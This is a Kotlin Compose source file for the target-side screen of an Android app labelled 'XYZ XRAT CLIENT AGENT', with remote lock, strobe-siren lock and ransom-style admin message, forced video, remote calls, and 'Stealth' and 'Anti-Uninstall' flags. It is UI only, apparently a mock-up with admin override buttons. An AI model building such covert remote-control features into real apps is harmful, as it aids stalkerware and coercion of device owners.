package com.example.ui.screens

import androidx.compose.animation.AnimatedVisibility
import androidx.compose.animation.core.FastOutSlowInEasing
import androidx.compose.animation.core.LinearEasing
import androidx.compose.animation.core.RepeatMode
import androidx.compose.animation.core.animateFloat
import androidx.compose.animation.core.infiniteRepeatable
import androidx.compose.animation.core.rememberInfiniteTransition
import androidx.compose.animation.core.tween
import androidx.compose.animation.fadeIn
import androidx.compose.animation.fadeOut
import androidx.compose.foundation.BorderStroke
import androidx.compose.foundation.Canvas
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Alarm
import androidx.compose.material.icons.filled.Call
import androidx.compose.material.icons.filled.CallEnd
import androidx.compose.material.icons.filled.FlashlightOn
import androidx.compose.material.icons.filled.Lock
import androidx.compose.material.icons.filled.Mic
import androidx.compose.material.icons.filled.PlayArrow
import androidx.compose.material.icons.filled.Security
import androidx.compose.material.icons.filled.Shield
import androidx.compose.material.icons.filled.Tune
import androidx.compose.material.icons.filled.Warning
import androidx.compose.material.icons.filled.Wifi
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.Card
import androidx.compose.material3.CardDefaults
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.getValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.draw.shadow
import androidx.compose.ui.geometry.Offset
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.drawscope.Stroke
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.testTag
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import coil.compose.AsyncImage
import coil.request.ImageRequest
import com.example.data.model.AppRole
import com.example.data.model.CallStatus
import com.example.data.model.DeviceState
import com.example.ui.theme.CyberBackground
import com.example.ui.theme.CyberBorder
import com.example.ui.theme.CyberCyan
import com.example.ui.theme.CyberGreen
import com.example.ui.theme.CyberRed
import com.example.ui.theme.CyberRedContainer
import com.example.ui.theme.CyberRedGlow
import com.example.ui.theme.CyberSurface
import com.example.ui.theme.TextPrimary
import com.example.ui.theme.TextSecondary
import com.example.ui.viewmodel.ControlViewModel

@Composable
fun AgentClientScreen(
    viewModel: ControlViewModel,
    deviceState: DeviceState,
    modifier: Modifier = Modifier
) {
    val infiniteTransition = rememberInfiniteTransition(label = "strobe")
    val strobeAlpha by infiniteTransition.animateFloat(
        initialValue = 0.2f,
        targetValue = 0.95f,
        animationSpec = infiniteRepeatable(
            animation = tween(200, easing = LinearEasing),
            repeatMode = RepeatMode.Reverse
        ),
        label = "strobeAlpha"
    )

    Box(modifier = modifier.fillMaxSize()) {
        // Dynamic Wallpaper Background
        AsyncImage(
            model = ImageRequest.Builder(LocalContext.current)
                .data(deviceState.currentWallpaper)
                .crossfade(true)
                .build(),
            contentDescription = "Agent Wallpaper",
            contentScale = ContentScale.Crop,
            modifier = Modifier.fillMaxSize()
        )

        // Semi-transparent dark overlay
        Box(
            modifier = Modifier
                .fillMaxSize()
                .background(Color.Black.copy(alpha = 0.45f))
        )

        // Normal Agent Home Layout
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(20.dp),
            verticalArrangement = Arrangement.SpaceBetween
        ) {
            // Top Status Bar Simulation
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                Surface(
                    shape = RoundedCornerShape(8.dp),
                    color = CyberSurface.copy(alpha = 0.85f),
                    border = BorderStroke(1.dp, CyberBorder)
                ) {
                    Row(
                        modifier = Modifier.padding(horizontal = 10.dp, vertical = 6.dp),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Box(
                            modifier = Modifier
                                .size(8.dp)
                                .background(CyberGreen, CircleShape)
                        )
                        Spacer(modifier = Modifier.width(6.dp))
                        Text(
                            text = "TARGET-01 • ONLINE",
                            fontSize = 10.sp,
                            fontWeight = FontWeight.Bold,
                            color = CyberGreen,
                            fontFamily = FontFamily.Monospace
                        )
                    }
                }

                // Switch back to Admin Console Button
                Button(
                    onClick = { viewModel.setAppRole(AppRole.ADMIN_CONSOLE) },
                    colors = ButtonDefaults.buttonColors(containerColor = CyberCyan),
                    shape = RoundedCornerShape(12.dp),
                    modifier = Modifier.testTag("btn_return_admin")
                ) {
                    Icon(Icons.Default.Tune, contentDescription = "Admin", tint = CyberBackground, modifier = Modifier.size(16.dp))
                    Spacer(modifier = Modifier.width(6.dp))
                    Text("ADMIN CONSOLE", fontSize = 11.sp, fontWeight = FontWeight.Bold, color = CyberBackground, fontFamily = FontFamily.Monospace)
                }
            }

            // Central Agent Phone Status Card
            Card(
                shape = RoundedCornerShape(24.dp),
                colors = CardDefaults.cardColors(containerColor = CyberSurface.copy(alpha = 0.9f)),
                border = BorderStroke(1.dp, CyberCyan.copy(alpha = 0.5f)),
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(vertical = 20.dp)
            ) {
                Column(
                    modifier = Modifier.padding(20.dp),
                    horizontalAlignment = Alignment.CenterHorizontally
                ) {
                    Icon(
                        imageVector = Icons.Default.Shield,
                        contentDescription = "Shield",
                        tint = CyberGreen,
                        modifier = Modifier.size(48.dp)
                    )
                    Spacer(modifier = Modifier.height(10.dp))
                    Text(
                        text = "XYZ XRAT CLIENT AGENT",
                        fontSize = 18.sp,
                        fontWeight = FontWeight.Black,
                        color = TextPrimary,
                        letterSpacing = 1.sp,
                        fontFamily = FontFamily.Monospace
                    )
                    Text(
                        text = "Device ID: ${deviceState.deviceId}",
                        fontSize = 12.sp,
                        color = CyberCyan,
                        fontFamily = FontFamily.Monospace
                    )

                    Spacer(modifier = Modifier.height(16.dp))

                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.SpaceEvenly
                    ) {
                        StatusIndicator(label = "Flashlight", active = deviceState.flashlightOn)
                        StatusIndicator(label = "Anti-Uninstall", active = deviceState.antiUninstallEnabled)
                        StatusIndicator(label = "Stealth", active = deviceState.isAppHidden)
                    }
                }
            }

            // Bottom Info
            Surface(
                shape = RoundedCornerShape(12.dp),
                color = CyberSurface.copy(alpha = 0.8f),
                modifier = Modifier.fillMaxWidth()
            ) {
                Text(
                    text = "This device is managed by Admin Console. All events, location, and commands are synchronized.",
                    fontSize = 11.sp,
                    color = TextSecondary,
                    textAlign = TextAlign.Center,
                    modifier = Modifier.padding(12.dp)
                )
            }
        }

        // =========================================================================
        // FULLSCREEN TAKEOVER: LOCK V1 (BLACKOUT LOCK SCREEN)
        // =========================================================================
        AnimatedVisibility(
            visible = deviceState.isLockedV1,
            enter = fadeIn(tween(300)),
            exit = fadeOut(tween(300))
        ) {
            Box(
                modifier = Modifier
                    .fillMaxSize()
                    .background(Color.Black),
                contentAlignment = Alignment.Center
            ) {
                Column(
                    horizontalAlignment = Alignment.CenterHorizontally,
                    modifier = Modifier.padding(24.dp)
                ) {
                    Surface(
                        shape = CircleShape,
                        color = CyberCyan.copy(alpha = 0.15f),
                        border = BorderStroke(2.dp, CyberCyan),
                        modifier = Modifier.size(90.dp)
                    ) {
                        Box(contentAlignment = Alignment.Center) {
                            Icon(
                                imageVector = Icons.Default.Lock,
                                contentDescription = "Locked",
                                tint = CyberCyan,
                                modifier = Modifier.size(48.dp)
                            )
                        }
                    }

                    Spacer(modifier = Modifier.height(24.dp))

                    Text(
                        text = "DEVICE LOCKED",
                        fontSize = 24.sp,
                        fontWeight = FontWeight.Black,
                        color = TextPrimary,
                        letterSpacing = 2.sp,
                        fontFamily = FontFamily.Monospace
                    )

                    Spacer(modifier = Modifier.height(8.dp))

                    val mins = deviceState.lockV1RemainingSeconds / 60
                    val secs = deviceState.lockV1RemainingSeconds % 60
                    Text(
                        text = "%02d:%02d".format(mins, secs),
                        fontSize = 54.sp,
                        fontWeight = FontWeight.Black,
                        color = CyberCyan,
                        fontFamily = FontFamily.Monospace
                    )

                    Text(
                        text = "REMAINING LOCK TIME",
                        fontSize = 12.sp,
                        fontWeight = FontWeight.Bold,
                        color = TextSecondary,
                        letterSpacing = 1.sp,
                        fontFamily = FontFamily.Monospace
                    )

                    Spacer(modifier = Modifier.height(24.dp))

                    Surface(
                        shape = RoundedCornerShape(12.dp),
                        color = CyberSurface,
                        border = BorderStroke(1.dp, CyberBorder),
                        modifier = Modifier.fillMaxWidth()
                    ) {
                        Text(
                            text = "Touch input and physical buttons are locked by Remote Administrator.\nPlease wait until timer expires or unlock is sent from Admin Console.",
                            fontSize = 12.sp,
                            color = TextSecondary,
                            textAlign = TextAlign.Center,
                            modifier = Modifier.padding(16.dp)
                        )
                    }

                    Spacer(modifier = Modifier.height(20.dp))

                    // Admin override button for preview purposes
                    Button(
                        onClick = { viewModel.toggleLockV1() },
                        colors = ButtonDefaults.buttonColors(containerColor = CyberCyan),
                        shape = RoundedCornerShape(12.dp)
                    ) {
                        Text("UNLOCK (ADMIN OVERRIDE)", color = CyberBackground, fontWeight = FontWeight.Bold, fontFamily = FontFamily.Monospace)
                    }
                }
            }
        }

        // =========================================================================
        // FULLSCREEN TAKEOVER: LOCK V2 (EMERGENCY ALARM SIREN & RED STROBE SCREEN)
        // =========================================================================
        AnimatedVisibility(
            visible = deviceState.isLockedV2,
            enter = fadeIn(tween(200)),
            exit = fadeOut(tween(200))
        ) {
            val strobeColor = Color(0xFFFF1E44).copy(alpha = strobeAlpha)

            Box(
                modifier = Modifier
                    .fillMaxSize()
                    .background(Color.Black),
                contentAlignment = Alignment.Center
            ) {
                // Flashing red strobe background overlay
                Box(
                    modifier = Modifier
                        .fillMaxSize()
                        .background(strobeColor)
                )

                // High-priority Alert Content
                Column(
                    horizontalAlignment = Alignment.CenterHorizontally,
                    modifier = Modifier
                        .fillMaxSize()
                        .padding(24.dp),
                    verticalArrangement = Arrangement.SpaceBetween
                ) {
                    // Top Siren Banner
                    Surface(
                        shape = RoundedCornerShape(14.dp),
                        color = Color.Black.copy(alpha = 0.9f),
                        border = BorderStroke(2.dp, CyberRed),
                        modifier = Modifier.fillMaxWidth()
                    ) {
                        Row(
                            modifier = Modifier.padding(14.dp),
                            horizontalArrangement = Arrangement.Center,
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            Icon(Icons.Default.Warning, contentDescription = "Alarm", tint = CyberRed, modifier = Modifier.size(24.dp))
                            Spacer(modifier = Modifier.width(10.dp))
                            Text(
                                text = "🚨 CRITICAL SECURITY ALARM 🚨",
                                fontSize = 14.sp,
                                fontWeight = FontWeight.Black,
                                color = CyberRed,
                                fontFamily = FontFamily.Monospace
                            )
                        }
                    }

                    // Center Padlock & Countdown
                    Column(horizontalAlignment = Alignment.CenterHorizontally) {
                        Surface(
                            shape = CircleShape,
                            color = Color.Black.copy(alpha = 0.85f),
                            border = BorderStroke(3.dp, CyberRed),
                            modifier = Modifier
                                .size(110.dp)
                                .shadow(24.dp, shape = CircleShape, spotColor = CyberRed)
                        ) {
                            Box(contentAlignment = Alignment.Center) {
                                Icon(
                                    imageVector = Icons.Default.Lock,
                                    contentDescription = "Locked Red",
                                    tint = CyberRed,
                                    modifier = Modifier.size(56.dp)
                                )
                            }
                        }

                        Spacer(modifier = Modifier.height(16.dp))

                        val mins = deviceState.lockV2RemainingSeconds / 60
                        val secs = deviceState.lockV2RemainingSeconds % 60
                        Text(
                            text = "%02d:%02d".format(mins, secs),
                            fontSize = 60.sp,
                            fontWeight = FontWeight.Black,
                            color = CyberRed,
                            fontFamily = FontFamily.Monospace,
                            modifier = Modifier
                                .background(Color.Black.copy(alpha = 0.8f), RoundedCornerShape(12.dp))
                                .padding(horizontal = 20.dp, vertical = 6.dp)
                        )

                        Spacer(modifier = Modifier.height(12.dp))

                        // Custom Admin Broadcast Message Card
                        Card(
                            shape = RoundedCornerShape(16.dp),
                            colors = CardDefaults.cardColors(containerColor = Color.Black.copy(alpha = 0.92f)),
                            border = BorderStroke(2.dp, CyberRed),
                            modifier = Modifier.fillMaxWidth()
                        ) {
                            Column(modifier = Modifier.padding(16.dp)) {
                                Text(
                                    text = "ADMIN BROADCAST MESSAGE:",
                                    fontSize = 11.sp,
                                    fontWeight = FontWeight.Black,
                                    color = CyberRed,
                                    fontFamily = FontFamily.Monospace
                                )
                                Spacer(modifier = Modifier.height(6.dp))
                                Text(
                                    text = deviceState.lockV2AdminMessage,
                                    fontSize = 14.sp,
                                    fontWeight = FontWeight.Bold,
                                    color = TextPrimary,
                                    textAlign = TextAlign.Center,
                                    modifier = Modifier.fillMaxWidth()
                                )
                            }
                        }
                    }

                    // Bottom Emergency Disarm Button
                    Button(
                        onClick = { viewModel.toggleLockV2() },
                        colors = ButtonDefaults.buttonColors(containerColor = Color.Black),
                        border = BorderStroke(2.dp, CyberRed),
                        shape = RoundedCornerShape(14.dp),
                        modifier = Modifier.fillMaxWidth()
                    ) {
                        Text(
                            text = "DISARM SIREN & UNLOCK (ADMIN OVERRIDE)",
                            fontSize = 12.sp,
                            fontWeight = FontWeight.Black,
                            color = CyberRed,
                            fontFamily = FontFamily.Monospace,
                            modifier = Modifier.padding(vertical = 4.dp)
                        )
                    }
                }
            }
        }

        // =========================================================================
        // FULLSCREEN TAKEOVER: VIDEO STREAM OVERLAY
        // =========================================================================
        AnimatedVisibility(
            visible = deviceState.videoPlaying,
            enter = fadeIn(),
            exit = fadeOut()
        ) {
            Box(
                modifier = Modifier
                    .fillMaxSize()
                    .background(Color.Black),
                contentAlignment = Alignment.Center
            ) {
                Column(
                    horizontalAlignment = Alignment.CenterHorizontally,
                    modifier = Modifier.padding(20.dp)
                ) {
                    Surface(
                        shape = RoundedCornerShape(16.dp),
                        color = CyberSurface,
                        border = BorderStroke(2.dp, CyberCyan),
                        modifier = Modifier
                            .fillMaxWidth()
                            .height(280.dp)
                    ) {
                        Box(contentAlignment = Alignment.Center) {
                            Column(horizontalAlignment = Alignment.CenterHorizontally) {
                                Icon(
                                    imageVector = Icons.Default.PlayArrow,
                                    contentDescription = "Video",
                                    tint = CyberCyan,
                                    modifier = Modifier.size(64.dp)
                                )
                                Spacer(modifier = Modifier.height(10.dp))
                                Text(
                                    text = "VIDEO STREAM FORCED BY ADMIN",
                                    fontSize = 14.sp,
                                    fontWeight = FontWeight.Bold,
                                    color = CyberCyan,
                                    fontFamily = FontFamily.Monospace
                                )
                                Text(
                                    text = deviceState.videoTitle,
                                    fontSize = 12.sp,
                                    color = TextPrimary
                                )
                                Spacer(modifier = Modifier.height(6.dp))
                                Text(
                                    text = "URL: ${deviceState.videoUrl}",
                                    fontSize = 10.sp,
                                    color = TextSecondary,
                                    maxLines = 1
                                )
                            }
                        }
                    }

                    Spacer(modifier = Modifier.height(20.dp))

                    Button(
                        onClick = { viewModel.toggleVideoPlayback() },
                        colors = ButtonDefaults.buttonColors(containerColor = CyberRed),
                        shape = RoundedCornerShape(12.dp)
                    ) {
                        Text("STOP VIDEO OVERLAY", fontWeight = FontWeight.Bold)
                    }
                }
            }
        }

        // =========================================================================
        // OVERLAY: INCOMING / OUTGOING REMOTE PHONE CALL
        // =========================================================================
        AnimatedVisibility(
            visible = deviceState.callStatus != CallStatus.IDLE,
            enter = fadeIn(),
            exit = fadeOut()
        ) {
            Box(
                modifier = Modifier
                    .fillMaxSize()
                    .background(Color.Black.copy(alpha = 0.9f)),
                contentAlignment = Alignment.Center
            ) {
                Card(
                    shape = RoundedCornerShape(24.dp),
                    colors = CardDefaults.cardColors(containerColor = CyberSurface),
                    border = BorderStroke(2.dp, CyberGreen),
                    modifier = Modifier
                        .fillMaxWidth(0.9f)
                        .padding(20.dp)
                ) {
                    Column(
                        modifier = Modifier.padding(24.dp),
                        horizontalAlignment = Alignment.CenterHorizontally
                    ) {
                        Icon(Icons.Default.Call, contentDescription = "Call", tint = CyberGreen, modifier = Modifier.size(48.dp))
                        Spacer(modifier = Modifier.height(12.dp))
                        Text(
                            text = "REMOTE PHONE CALL",
                            fontSize = 16.sp,
                            fontWeight = FontWeight.Bold,
                            color = CyberGreen,
                            fontFamily = FontFamily.Monospace
                        )
                        Text(
                            text = deviceState.callNumber,
                            fontSize = 20.sp,
                            fontWeight = FontWeight.Black,
                            color = TextPrimary,
                            fontFamily = FontFamily.Monospace
                        )
                        Text(
                            text = "STATUS: ${deviceState.callStatus.name}",
                            fontSize = 12.sp,
                            color = CyberCyan,
                            fontFamily = FontFamily.Monospace
                        )

                        if (deviceState.adminIntercomActive) {
                            Spacer(modifier = Modifier.height(12.dp))
                            Surface(
                                shape = RoundedCornerShape(8.dp),
                                color = CyberRed.copy(alpha = 0.2f),
                                border = BorderStroke(1.dp, CyberRed)
                            ) {
                                Row(
                                    modifier = Modifier.padding(8.dp),
                                    verticalAlignment = Alignment.CenterVertically
                                ) {
                                    Icon(Icons.Default.Mic, contentDescription = "Mic", tint = CyberRed, modifier = Modifier.size(16.dp))
                                    Spacer(modifier = Modifier.width(6.dp))
                                    Text("ADMIN VOICE INTERCOM CONNECTED", fontSize = 10.sp, color = CyberRed, fontWeight = FontWeight.Bold)
                                }
                            }
                        }

                        Spacer(modifier = Modifier.height(20.dp))

                        Button(
                            onClick = { viewModel.endRemoteCall() },
                            colors = ButtonDefaults.buttonColors(containerColor = CyberRed),
                            shape = RoundedCornerShape(12.dp)
                        ) {
                            Icon(Icons.Default.CallEnd, contentDescription = "End Call", tint = TextPrimary)
                            Spacer(modifier = Modifier.width(6.dp))
                            Text("HANG UP", fontWeight = FontWeight.Bold)
                        }
                    }
                }
            }
        }
    }
}

@Composable
private fun StatusIndicator(label: String, active: Boolean) {
    Column(horizontalAlignment = Alignment.CenterHorizontally) {
        Box(
            modifier = Modifier
                .size(10.dp)
                .background(if (active) CyberGreen else CyberBorder, CircleShape)
        )
        Spacer(modifier = Modifier.height(4.dp))
        Text(
            text = label,
            fontSize = 10.sp,
            color = if (active) TextPrimary else TextSecondary,
            fontFamily = FontFamily.Monospace
        )
    }
}
